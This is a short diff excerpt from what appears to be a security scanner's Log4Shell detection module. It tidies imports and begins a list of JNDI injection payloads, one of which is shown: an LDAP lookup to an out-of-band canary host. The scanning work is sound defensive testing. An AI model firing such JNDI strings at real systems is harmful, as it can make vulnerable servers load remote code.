@@ -15,11 +15,10 @@ and uses OOB callbacks for blind detection.
 from __future__ import annotations
 
 import json
-import re
 from typing import List
 from scanner.core.crawler import CrawlResult
-from scanner.core.scan_result import Finding, Severity
-from scanner.utils.http import get_url_params, inject_url_param, fetch
+from scanner.core.scan_result import Finding
+from scanner.utils.http import get_url_params, inject_url_param
 
 _JNDI_VARIANTS = [
     "${jndi:ldap://{{CANARY}}/log4j}",
